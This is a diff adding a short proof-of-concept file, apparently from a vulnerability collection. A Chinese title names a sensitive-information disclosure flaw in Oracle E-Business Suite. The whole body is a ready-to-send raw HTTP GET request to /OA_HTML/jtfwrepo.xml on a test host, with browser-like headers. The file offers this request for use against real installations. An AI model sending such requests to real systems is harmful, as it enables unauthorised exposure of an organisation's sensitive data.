@@ -1,0 +1,8 @@
+# Oracle E-Business Suite /OA_HTML/jtfwrepo.xml 敏感信息泄漏漏洞
+GET /OA_HTML/jtfwrepo.xml?_ZQA_ID=bb012c4523780b75& HTTP/1.1
+Host: www.byp-test.com:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+
